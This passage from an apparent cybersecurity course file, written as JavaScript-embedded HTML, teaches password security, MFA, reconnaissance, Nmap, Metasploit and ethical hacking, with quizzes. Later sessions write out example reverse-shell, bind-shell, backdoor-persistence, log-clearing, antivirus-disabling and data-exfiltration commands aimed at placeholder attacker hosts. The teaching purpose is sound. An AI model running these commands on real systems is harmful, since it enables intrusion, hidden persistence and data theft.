                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use a password manager (e.g., Bitwarden, LastPass) to generate and store a strong password</li>
                                <li>Test password strength using an online checker like https://howsecureismypassword.net</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Multi-Factor Authentication (MFA)',
                        content: `
                            <h4 class="font-bold">What is MFA?</h4>
                            <ul class="pl-6 mb-6">
                                <li>An extra layer of security requiring two or more forms of verification</li>
                                <li>Protects against password leaks and unauthorized access</li>
                            </ul>
            
                            <h4 class="font-bold">Types of MFA</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Something You Know:</strong> Passwords, PINs</li>
                                <li><strong>Something You Have:</strong> OTP (One-Time Password), Authenticator apps</li>
                                <li><strong>Something You Are:</strong> Biometric authentication (fingerprint, facial recognition)</li>
                            </ul>
            
                            <h4 class="font-bold">Best Practices for MFA</h4>
                            <ul class="pl-6 mb-6">
                                <li>Enable MFA on all critical accounts (email, banking, social media)</li>
                                <li>Prefer authenticator apps over SMS-based MFA</li>
                                <li>Regularly update and review MFA settings</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Safe Browsing Practices',
                        content: `
                            <h4 class="font-bold">Risks of Unsafe Browsing</h4>
                            <ul class="pl-6 mb-6">
                                <li>Phishing websites steal credentials</li>
                                <li>Drive-by downloads install malware automatically</li>
                                <li>Unsecured public Wi-Fi exposes users to attacks</li>
                            </ul>
            
                            <h4 class="font-bold">Best Practices for Safe Browsing</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use HTTPS websites for secure communication</li>
                                <li>Avoid clicking on suspicious links or ads</li>
                                <li>Install browser security extensions like uBlock Origin, HTTPS Everywhere</li>
                                <li>Regularly clear cookies and cache to remove tracking data</li>
                                <li>Be cautious of free downloads and software from unknown sources</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Securing Email Communication',
                        content: `
                            <h4 class="font-bold">Common Email Threats</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Phishing Attacks:</strong> Fake emails trick users into revealing credentials</li>
                                <li><strong>Business Email Compromise (BEC):</strong> Impersonation scams targeting organizations</li>
                                <li><strong>Email Spoofing:</strong> Attackers forge sender addresses to appear legitimate</li>
                            </ul>
            
                            <h4 class="font-bold">Best Practices for Email Security</h4>
                            <ul class="pl-6 mb-6">
                                <li>Verify Sender Authenticity - Check email addresses for slight modifications</li>
                                <li>Avoid Clicking on Suspicious Links - Hover over links to inspect the actual URL</li>
                                <li>Use Email Encryption - Encrypt sensitive emails using PGP</li>
                                <li>Enable Spam Filtering - Configure email filters to block phishing attempts</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session 6 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the most secure way to store passwords?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Writing them down in a notebook</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Using a password manager</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Keeping them in a Word document</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What are the dangers of using the same password across multiple accounts?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between phishing and business email compromise (BEC).</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Configure MFA on two personal accounts and document the process.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    }
                    
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-2",
                title: 'Module 2: Ethical Hacking & Penetration Testing',
                icon: Shield,
                sections: [
                    {
                        title: 'Session 1: Part 1: What is Ethical Hacking?',
                        content: `
                            <h4 class="font-bold">Definition & Purpose</h4>
                            <p class="mb-4">Ethical hacking refers to legally breaking into computers and devices to test an organization's defenses.</p>
                            
                            <h4 class="font-bold">Key Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Identify security vulnerabilities before malicious hackers do</li>
                                <li>Strengthen cybersecurity defenses</li>
                                <li>Assist organizations in compliance with security regulations</li>
                            </ul>
            
                            <h4 class="font-bold">Types of Hackers</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Type</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">White Hat Hackers</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Ethical hackers who legally test and secure systems</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Black Hat Hackers</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Malicious hackers who exploit vulnerabilities for personal gain</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Grey Hat Hackers</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Hackers who operate between ethical and unethical hacking</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Part 2: Roles & Responsibilities of an Ethical Hacker',
                        content: `
                            <h4 class="font-bold">Key Responsibilities</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Penetration Testing:</strong> Simulating cyberattacks to find vulnerabilities</li>
                                <li><strong>Vulnerability Assessment:</strong> Identifying security weaknesses in systems</li>
                                <li><strong>Network Security Analysis:</strong> Ensuring firewall and security configurations are robust</li>
                                <li><strong>Incident Response:</strong> Assisting in cybersecurity incident investigations</li>
                                <li><strong>Social Engineering Testing:</strong> Assessing employee vulnerability to phishing attacks</li>
                            </ul>
            
                            <h4 class="font-bold">Legal & Ethical Considerations</h4>
                            <ul class="pl-6 mb-6">
                                <li>Must obtain written permission before testing systems</li>
                                <li>Must adhere to cybersecurity laws (GDPR, CFAA, NIST guidelines)</li>
                                <li>Unauthorized hacking, even for good intentions, is illegal</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Cybersecurity Certifications',
                        content: `
                            <h4 class="font-bold">Certified Ethical Hacker (CEH)</h4>
                            <ul class="pl-6 mb-6">
                                <li>Offered by EC-Council</li>
                                <li>Focuses on ethical hacking methodologies and penetration testing</li>
                                <li>Ideal for beginners in ethical hacking</li>
                            </ul>
            
                            <h4 class="font-bold">Offensive Security Certified Professional (OSCP)</h4>
                            <ul class="pl-6 mb-6">
                                <li>Offered by Offensive Security</li>
                                <li>Hands-on, real-world penetration testing certification</li>
                                <li>Requires practical exploitation of vulnerabilities</li>
                            </ul>
            
                            <h4 class="font-bold">CISSP</h4>
                            <ul class="pl-6 mb-6">
                                <li>Offered by (ISC)²</li>
                                <li>Covers wide range of security topics</li>
                                <li>Best suited for cybersecurity managers</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session 1 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the main purpose of ethical hacking?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) To steal sensitive data</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) To identify and fix security vulnerabilities</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) To test illegal hacking techniques</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between a white hat hacker and a black hat hacker.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why is OSCP considered a highly technical certification for penetration testers?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Research and list the prerequisites for each certification (CEH, OSCP, CISSP) and determine which one aligns best with your career goals.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 2: Part 1: Passive vs. Active Reconnaissance',
                        content: `
                            <h4 class="font-bold">What is Reconnaissance?</h4>
                            <p class="mb-4">Reconnaissance is the first phase of ethical hacking and penetration testing, where an attacker gathers information about the target before launching an attack.</p>
            
                            <h4 class="font-bold">Passive Reconnaissance</h4>
                            <ul class="pl-6 mb-6">
                                <li>Involves gathering information without directly engaging with the target</li>
                                <li><strong>Examples:</strong>
                                    <ul class="pl-6">
                                        <li>OSINT (Open-Source Intelligence)</li>
                                        <li>Whois lookups</li>
                                        <li>Social media research</li>
                                        <li>Google Dorking</li>
                                    </ul>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Active Reconnaissance</h4>
                            <ul class="pl-6 mb-6">
                                <li>Involves directly interacting with the target system to obtain information</li>
                                <li><strong>Examples:</strong>
                                    <ul class="pl-6">
                                        <li>Network scanning using Nmap</li>
                                        <li>Web application scanning</li>
                                        <li>Port scanning and enumeration</li>
                                    </ul>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: OSINT (Open-Source Intelligence)',
                        content: `
                            <h4 class="font-bold">What is OSINT?</h4>
                            <p class="mb-4">OSINT refers to gathering publicly available data to extract intelligence about a target.</p>
            
                            <h4 class="font-bold">Popular OSINT Tools & Techniques</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Google Dorking:</strong> Using advanced search queries to find sensitive information</li>
                                <li><strong>Shodan:</strong> A search engine for discovering internet-connected devices</li>
                                <li><strong>Whois Lookup:</strong> Finding domain registration details</li>
                                <li><strong>TheHarvester:</strong> Collecting email addresses and subdomains</li>
                                <li><strong>Maltego:</strong> A powerful tool for visualizing relationships between data points</li>
                            </ul>
            
                            <h4 class="font-bold">Practical Tasks</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use Google Dorking to find hidden login pages of a website</li>
                                <li>Conduct a basic OSINT investigation using Maltego</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Reconnaissance Tools',
                        content: `
                            <h4 class="font-bold">Whois Lookup</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>whois example.com</code>
                            </div>
                            <p class="mb-4">Provides details about domain ownership, contact info, and DNS records.</p>
            
                            <h4 class="font-bold">Shodan</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>shodan search "default password"</code>
                            </div>
            
                            <h4 class="font-bold">Google Dorking Examples</h4>
                            <ul class="pl-6 mb-6">
                                <li><code>site:example.com filetype:pdf</code> → Finds PDFs on a website</li>
                                <li><code>intitle:"index of" site:example.com</code> → Lists open directories</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Practical Recon using Kali Linux',
                        content: `
                            <h4 class="font-bold">Essential Reconnaissance Tools in Kali Linux</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Nmap:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap -sV -p 80,443 example.com</code>
                                    </div>
                                </li>
                                <li><strong>TheHarvester:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>theHarvester -d example.com -b google</code>
                                    </div>
                                </li>
                                <li><strong>Recon-ng:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>recon-ng</code>
                                    </div>
                                </li>
                                <li><strong>Dnsenum:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>dnsenum example.com</code>
                                    </div>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is best for discovering exposed IoT devices?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Nmap</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Shodan</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) TheHarvester</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What are three common OSINT techniques?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can Google Dorking be misused by attackers?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Perform a Whois lookup, a Shodan scan, and a Google Dorking search on a target domain (ethical testing only!).</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 3: Part 1: Network Scanning with Nmap',
                        content: `
                            <h4 class="font-bold">What is Network Scanning?</h4>
                            <p class="mb-4">Network scanning is the process of detecting active hosts, services, and vulnerabilities within a network.</p>
            
                            <h4 class="font-bold">Introduction to Nmap</h4>
                            <p class="mb-4">Nmap (Network Mapper) is a powerful tool used for network discovery and security auditing.</p>
            
                            <h4 class="font-bold">Basic Nmap Scanning Commands</h4>
                            <ul class="pl-6 mb-6">
                                <li>
                                    <strong>Scan a single IP:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap 192.168.1.1</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Scan a range of IPs:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap 192.168.1.1-100</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Scan an entire subnet:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap 192.168.1.0/24</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Detect operating system and services:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap -A 192.168.1.1</code>
                                    </div>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Port Scanning Techniques',
                        content: `
                            <h4 class="font-bold">Types of Port Scans</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>TCP Connect Scan (-sT):</strong> Establishes a full connection to detect open ports</li>
                                <li><strong>SYN Scan (-sS):</strong> A stealthier scan that does not complete the handshake</li>
                                <li><strong>UDP Scan (-sU):</strong> Identifies open UDP ports</li>
                                <li><strong>Aggressive Scan (-A):</strong> Combines multiple techniques, including OS detection</li>
                                <li><strong>Version Detection (-sV):</strong> Identifies software versions running on ports</li>
                            </ul>
            
                            <h4 class="font-bold">Example Commands</h4>
                            <ul class="pl-6 mb-6">
                                <li>
                                    <strong>SYN scan on a target:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap -sS 192.168.1.1</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Scan specific ports:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap -p 22,80,443 192.168.1.1</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Aggressive scanning mode:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nmap -A 192.168.1.1</code>
                                    </div>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Banner Grabbing & Service Detection',
                        content: `
                            <h4 class="font-bold">What is Banner Grabbing?</h4>
                            <p class="mb-4">A technique used to gather information about a service running on an open port. It helps identify software versions that may be vulnerable.</p>
            
                            <h4 class="font-bold">Tools for Banner Grabbing</h4>
                            <ul class="pl-6 mb-6">
                                <li>
                                    <strong>Telnet:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>telnet 192.168.1.1 80</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Netcat:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>nc -v 192.168.1.1 80</code>
                                    </div>
                                </li>
                                <li><strong>Nmap (-sV):</strong> Service version detection</li>
                                <li><strong>WhatWeb:</strong> Identifies web technologies running on a server</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Identifying Vulnerabilities with Nessus',
                        content: `
                            <h4 class="font-bold">What is Nessus?</h4>
                            <p class="mb-4">Nessus is a widely used vulnerability scanner that helps detect security flaws in systems and networks.</p>
            
                            <h4 class="font-bold">Using Nessus for Vulnerability Scanning</h4>
                            <ol class="pl-6 mb-6">
                                <li>Install and launch Nessus on a test environment</li>
                                <li>Run a basic scan to identify vulnerabilities</li>
                                <li>Analyze reports to understand risks and mitigation strategies</li>
                            </ol>
                        `
                    },
                    {
                        title: 'Part 5: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What type of scan is considered stealthy and avoids detection?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) TCP Connect Scan</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) SYN Scan</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) UDP Scan</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between active and passive scanning.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How does banner grabbing help identify security weaknesses?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Conduct an Nmap scan, banner grabbing, and Nessus vulnerability scan on a test system. Document the findings.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 4: Part 1: Exploiting Vulnerabilities with Metasploit',
                        content: `
                            <h4 class="font-bold">What is Metasploit?</h4>
                            <p class="mb-4">Metasploit is an open-source penetration testing framework used to identify and exploit security vulnerabilities, conduct post-exploitation activities, and automate penetration testing workflows.</p>
            
                            <h4 class="font-bold">Basic Metasploit Commands</h4>
                            <ul class="pl-6 mb-6">
                                <li>
                                    <strong>Launch Metasploit:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>msfconsole</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Search for an exploit:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>search exploit_name</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Use an exploit:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>use exploit/path</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Set target options:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>set RHOSTS <target-IP></code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Run the exploit:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>exploit</code>
                                    </div>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Reverse Shell & Bind Shell Attacks',
                        content: `
                            <h4 class="font-bold">What is a Shell?</h4>
                            <p class="mb-4">A shell allows an attacker to execute commands on a compromised system remotely.</p>
            
                            <h4 class="font-bold">Types of Shells</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. Reverse Shell</h5>
                                <ul class="pl-6 mb-4">
                                    <li>The target machine connects back to the attacker's system</li>
                                    <li>Useful when the target is behind a firewall or NAT</li>
                                    <li>
                                        <strong>Example command:</strong>
                                        <div class="bg-gray-100 p-2 mt-2 rounded">
                                            <code>nc -lvnp 4444 # attacker</code>
                                            <br>
                                            <code>nc <attacker-IP> 4444 -e /bin/bash # victim</code>
                                        </div>
                                    </li>
                                </ul>
            
                                <h5 class="font-semibold">2. Bind Shell</h5>
                                <ul class="pl-6 mb-4">
                                    <li>The target machine opens a port and waits for an attacker to connect</li>
                                    <li>Less stealthy as it requires an open port</li>
                                    <li>
                                        <strong>Example command:</strong>
                                        <div class="bg-gray-100 p-2 mt-2 rounded">
                                            <code>nc -lp 4444 -e /bin/bash</code>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Password Cracking Tools',
                        content: `
                            <h4 class="font-bold">John the Ripper (JtR)</h4>
                            <p class="mb-4">A powerful password-cracking tool that uses brute force and dictionary attacks.</p>
            
                            <h4 class="font-bold">Basic John the Ripper Commands</h4>
                            <ul class="pl-6 mb-6">
                                <li>
                                    <strong>Cracking a hashed password:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>john --format=raw-md5 hash.txt</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Using a wordlist attack:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hashcat</h4>
                            <p class="mb-4">A fast password-cracking tool that supports GPU acceleration.</p>
            
                            <h4 class="font-bold">Basic Hashcat Commands</h4>
                            <ul class="pl-6 mb-6">
                                <li>
                                    <strong>Identify hash type:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>hashid hash.txt</code>
                                    </div>
                                </li>
                                <li>
                                    <strong>Run dictionary attack:</strong>
                                    <div class="bg-gray-100 p-2 mb-2 rounded">
                                        <code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code>
                                    </div>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Privilege Escalation Techniques',
                        content: `
                            <h4 class="font-bold">What is Privilege Escalation?</h4>
                            <p class="mb-4">Privilege escalation is gaining higher system privileges to perform administrative actions.</p>
            
                            <h4 class="font-bold">Types of Privilege Escalation</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Vertical Escalation:</strong> Gaining higher privileges (e.g., from user to root)</li>
                                <li><strong>Horizontal Escalation:</strong> Gaining access to other user accounts without increasing privilege levels</li>
                            </ul>
            
                            <h4 class="font-bold">Common Privilege Escalation Methods</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Kernel Exploits:</strong> Exploiting vulnerabilities in the operating system kernel</li>
                                <li><strong>Mimikatz:</strong> Extracting passwords and credentials from Windows memory</li>
                                <li><strong>Sudo Misconfigurations:</strong> Running unauthorized commands via sudo -l</li>
                                <li><strong>DLL Hijacking:</strong> Replacing legitimate DLL files with malicious ones</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the primary use of Metasploit?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Password storage</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Exploiting vulnerabilities</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Writing secure software</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain how John the Ripper and Hashcat differ in their approach to password cracking.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why is privilege escalation an essential step in penetration testing?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Set up a Metasploit exploit, gain a shell, and escalate privileges on a test machine.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 5: Part 1: Maintaining Access on Compromised Systems',
                        content: `
                            <h4 class="font-bold">Why Maintain Access?</h4>
                            <p class="mb-4">After successfully exploiting a system, attackers often establish persistence to ensure long-term control over the target.</p>
            
                            <h4 class="font-bold">Common Persistence Techniques</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. Creating New User Accounts</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>net user attacker P@ssw0rd /add & net localgroup administrators attacker /add</code>
                                </div>
            
                                <h5 class="font-semibold">2. Modifying Startup Scripts</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Windows: C:\Users\Public\Start Menu\Programs\Startup</li>
                                    <li>Linux: /etc/rc.local or ~/.bashrc</li>
                                </ul>
            
                                <h5 class="font-semibold">3. Scheduled Tasks & Cron Jobs</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>schtasks /create /tn "Update Service" /tr "C:\malware.exe" /sc daily</code>
                                    <br>
                                    <code>echo "@reboot /root/backdoor.sh" >> /etc/crontab</code>
                                </div>
            
                                <h5 class="font-semibold">4. Registry Modifications (Windows)</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d C:\malware.exe</code>
                                </div>
                            </div>
                        `
                    },
                    {
                        title: 'Part 2: Covering Tracks & Evading Detection',
                        content: `
                            <h4 class="font-bold">Why Cover Tracks?</h4>
                            <p class="mb-4">To avoid detection by security teams and forensic investigators, attackers use various anti-forensic techniques.</p>
            
                            <h4 class="font-bold">Common Anti-Forensic Techniques</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. Clearing Logs</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>wevtutil cl System</code>
                                    <br>
                                    <code>echo > /var/log/auth.log</code>
                                </div>
            
                                <h5 class="font-semibold">2. Timestamp Manipulation</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>touch -t 202301010101 /var/tmp/backdoor.sh</code>
                                </div>
            
                                <h5 class="font-semibold">3. Disabling Security Software</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"</code>
                                    <br>
                                    <code>killall snort</code>
                                </div>
                            </div>
                        `
                    },
                    {
                        title: 'Part 3: Extracting & Exfiltrating Sensitive Data',
                        content: `
                            <h4 class="font-bold">Data Extraction vs. Exfiltration</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Extraction:</strong> Gathering and preparing data for exfiltration</li>
                                <li><strong>Exfiltration:</strong> Sending stolen data out of the compromised network</li>
                            </ul>
            
                            <h4 class="font-bold">Data Exfiltration Methods</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">1. File Transfer via Netcat</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>nc -lvp 4444 > stolen_data.zip # attacker</code>
                                    <br>
                                    <code>nc <attacker-IP> 4444 < data.zip # victim</code>
                                </div>
            
                                <h5 class="font-semibold">2. DNS Tunneling</h5>
                                <p class="mb-2">Using DNS queries to secretly exfiltrate data (Example tool: Dnscat2)</p>
            
                                <h5 class="font-semibold">3. Cloud Storage Abuse</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>rclone copy sensitive_data s3://attacker-bucket</code>
                                </div>
            
                                <h5 class="font-semibold">4. Steganography</h5>
                                <div class="bg-gray-100 p-2 mb-4 rounded">
                                    <code>steghide embed -cf image.jpg -ef secret.txt</code>
                                </div>
                            </div>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the purpose of a persistent backdoor?</p>
                                    <div class="ml-4 mt-2">
